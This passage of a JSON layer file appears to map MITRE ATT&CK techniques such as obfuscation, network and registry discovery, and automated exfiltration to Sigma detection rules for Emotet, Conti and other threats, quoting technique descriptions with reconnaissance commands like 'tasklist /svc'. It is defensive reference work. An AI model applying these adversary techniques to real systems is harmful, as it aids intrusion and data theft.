            "comment": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also use compressed or archived scripts, such as JavaScript. \n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)\n\nAdversaries may also abuse [Command Obfuscation](https://attack.mitre.org/techniques/T1027/010) to obscure commands executed from payloads or directly via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017) ",
            "metadata": [
                {
                    "name": "proc_creation_win_apt_turla_comrat_may20.yml",
                    "value": "sigma\\rules-emerging-threats\\2014\\TA\\Turla\\proc_creation_win_apt_turla_comrat_may20.yml"
                },
                {
                    "name": "proc_creation_win_malware_emotet.yml",
                    "value": "sigma\\rules-emerging-threats\\2019\\Malware\\Emotet\\proc_creation_win_malware_emotet.yml"
                },
                {
                    "name": "proc_creation_win_apt_wocao.yml",
                    "value": "sigma\\rules-emerging-threats\\2019\\TA\\Operation-Wocao\\proc_creation_win_apt_wocao.yml"
                },
                {
                    "name": "win_security_apt_wocao.yml",
                    "value": "sigma\\rules-emerging-threats\\2019\\TA\\Operation-Wocao\\win_security_apt_wocao.yml"
                }
            ]
        },
        {
            "techniqueID": "T1020",
            "score": 1,
            "comment": "Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection. \n\nWhen automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) and [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).",
            "metadata": [
                {
                    "name": "microsoft365_susp_email_forwarding_activity.yml",
                    "value": "sigma\\rules-threat-hunting\\cloud\\m365\\audit\\microsoft365_susp_email_forwarding_activity.yml"
                }
            ]
        },
        {
            "techniqueID": "T1016",
            "score": 3,
            "comment": "Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).\n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).(Citation: US-CERT-TA18-106A)(Citation: Mandiant APT41 Global Intrusion )\n\nAdversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next. ",
            "metadata": [
                {
                    "name": "proc_creation_win_malware_pikabot_discovery.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\Malware\\Pikabot\\proc_creation_win_malware_pikabot_discovery.yml"
                },
                {
                    "name": "proc_creation_win_userdomain_variable_enumeration.yml",
                    "value": "sigma\\rules-placeholder\\windows\\process_creation\\proc_creation_win_userdomain_variable_enumeration.yml"
                },
                {
                    "name": "posh_pm_susp_netfirewallrule_recon.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\powershell\\powershell_module\\posh_pm_susp_netfirewallrule_recon.yml"
                }
            ]
        },
        {
            "techniqueID": "T1012",
            "score": 5,
            "comment": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\n\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security.(Citation: Wikipedia Windows Registry) Information can easily be queried using the [Reg](https://attack.mitre.org/software/S0075) utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from [Query Registry](https://attack.mitre.org/techniques/T1012) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
            "metadata": [
                {
                    "name": "proc_creation_win_malware_babyshark.yml",
                    "value": "sigma\\rules-emerging-threats\\2019\\Malware\\BabyShark\\proc_creation_win_malware_babyshark.yml"
                },
                {
                    "name": "proc_creation_win_apt_wocao.yml",
                    "value": "sigma\\rules-emerging-threats\\2019\\TA\\Operation-Wocao\\proc_creation_win_apt_wocao.yml"
                },
                {
                    "name": "win_security_apt_wocao.yml",
                    "value": "sigma\\rules-emerging-threats\\2019\\TA\\Operation-Wocao\\win_security_apt_wocao.yml"
                },
                {
                    "name": "win_security_remote_registry_management_via_reg.yml",
                    "value": "sigma\\rules-placeholder\\windows\\builtin\\security\\win_security_remote_registry_management_via_reg.yml"
                },
                {
                    "name": "posh_ps_registry_reconnaissance.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\powershell\\powershell_script\\posh_ps_registry_reconnaissance.yml"
                }
            ]
        },
        {
            "techniqueID": "T1007",
            "score": 1,
            "comment": "Adversaries may try to gather information about registered local system services. Adversaries may obtain information about services using tools as well as OS utility commands such as <code>sc query</code>, <code>tasklist /svc</code>, <code>systemctl --type=service</code>, and <code>net start</code>.\n\nAdversaries may use the information from [System Service Discovery](https://attack.mitre.org/techniques/T1007) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
            "metadata": [
                {
                    "name": "posh_ps_registry_reconnaissance.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\powershell\\powershell_script\\posh_ps_registry_reconnaissance.yml"
                }
            ]
        },
        {
            "techniqueID": "T1005",
            "score": 1,
            "comment": "Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106) as well as a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008), which have functionality to interact with the file system to gather information.(Citation: show_run_config_cmd_cisco) Adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.\n",
            "metadata": [
                {
                    "name": "proc_creation_win_malware_conti_ransomware_database_dump.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Malware\\Conti\\proc_creation_win_malware_conti_ransomware_database_dump.yml"
                }
            ]
        }
    ]
}